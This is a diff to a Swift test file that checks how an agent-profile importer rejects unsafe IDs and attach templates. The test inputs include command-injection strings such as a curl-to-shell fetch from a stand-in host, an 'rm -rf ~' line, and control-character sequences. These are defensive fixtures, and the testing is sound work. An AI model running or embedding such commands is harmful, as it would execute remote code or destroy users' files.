@@ -169,7 +169,10 @@ final class CustomAgentsTests: XCTestCase {
 
     func testImportRejectsPathLikeAndInvalidIDs() throws {
         let store = ProfileStore(userFileURL: userURL)
-        for id in ["../escape", "a/b", "UPPER", "", String(repeating: "a", count: 65), "dots.png"] {
+        // Path-like or malformed, the pickers' "auto"/"none" mode tags, and any
+        // id without the "custom-" prefix (a future built-in could take it).
+        for id in ["../escape", "a/b", "UPPER", "", String(repeating: "a", count: 65), "dots.png",
+                   "auto", "none", "cursor", "custom-", "custom-../x"] {
             let json = #"{"agents":[{"id":"\#(id)","displayName":"X","detectionMarkers":["x"]}]}"#
             XCTAssertThrowsError(try store.importBundle(Data(json.utf8)), id) { error in
                 XCTAssertEqual(error as? ProfileStore.ProfileError, .invalidID(id))
@@ -208,6 +211,62 @@ final class CustomAgentsTests: XCTestCase {
         try store.importBundle(Data(update.utf8))
         XCTAssertEqual(store.customAgents.count, 1, "replaced, not duplicated")
         XCTAssertEqual(store.agent(id: "custom-fake-agent-abc123")?.displayName, "Fake Agent 2")
+    }
+
+    /// A shared file must not be able to plant a command: attach text is
+    /// typed into the remote shell after an upload, and a newline (or any
+    /// control character) would submit it without the user pressing Return.
+    func testImportRejectsAttachTextThatCouldRunACommand() throws {
+        let store = ProfileStore(userFileURL: userURL)
+        try store.upsert(fakeAgent())
+        let fileBefore = try Data(contentsOf: userURL)
+        let unsafe = [
+            "{path}; curl -s https://evil.example/x | sh\n",  // the attack: auto-submitted
+            "{path}\r",
+            "\u{1B}[200~{path}",                              // escape sequence
+            "\u{03}{path}",                                    // ^C
+            "{path}\u{2028}",                                  // Unicode line separator
+            "no placeholder at all",
+            "{path}" + String(repeating: "x", count: AgentProfile.attachTemplateMaxLength),
+        ]
+        for template in unsafe {
+            let agent: [String: Any] = ["id": "custom-helper", "displayName": "Helper",
+                                        "detectionMarkers": ["last login"], "attachTemplate": template]
+            let data = try JSONSerialization.data(withJSONObject: ["agents": [agent]])
+            XCTAssertThrowsError(try store.importBundle(data), template.debugDescription) { error in
+                XCTAssertEqual(error as? ProfileStore.ProfileError, .unsafeAttachTemplate("Helper"))
+                let message = (error as? LocalizedError)?.errorDescription ?? ""
+                XCTAssertTrue(message.contains("never presses Return"), message)
+            }
+        }
+        XCTAssertNil(store.agent(id: "custom-helper"))
+        XCTAssertEqual(try Data(contentsOf: userURL), fileBefore, "file unchanged")
+
+        // Plain text around {path} is fine: the user sees it on the prompt.
+        let ok = #"{"agents":[{"id":"custom-helper","displayName":"Helper","detectionMarkers":["helper"],"attachTemplate":"/attach {path} "}]}"#
+        try store.importBundle(Data(ok.utf8))
+        XCTAssertEqual(store.agent(id: "custom-helper")?.formatAttachment(path: "/x/y.png"), "/attach /x/y.png ")
+
+        // The editor's save path is held to the same rule.
+        var edited = try XCTUnwrap(store.agent(id: "custom-helper"))
+        edited.attachTemplate = "{path}\n"
+        XCTAssertThrowsError(try store.upsert(edited)) { error in
+            XCTAssertEqual(error as? ProfileStore.ProfileError, .unsafeAttachTemplate("Helper"))
+        }
+    }
+
+    /// A user file that never went through validation (older build, hand
+    /// edit) still can't give a custom agent submitting attach text; a
+    /// built-in override keeps its own (aider's `/add {path}\n` is real).
+    func testLoadedCustomAgentNeverKeepsUnsafeAttachText() throws {
+        let json = """
+        {"agents":[{"id":"custom-old","displayName":"Old","detectionMarkers":["old"],"attachTemplate":"{path}; rm -rf ~\\n"},
+                   {"id":"aider","displayName":"aider","detectionMarkers":["aider"],"attachTemplate":"/add {path}\\n"}]}
+        """
+        try Data(json.utf8).write(to: userURL)
+        let store = ProfileStore(userFileURL: userURL)
+        XCTAssertEqual(store.agent(id: "custom-old")?.attachTemplate, AgentProfile.defaultAttachTemplate)
+        XCTAssertEqual(store.agent(id: "aider")?.attachTemplate, "/add {path}\n")
     }
 
     func testExportRoundTripsWithoutIcons() throws {
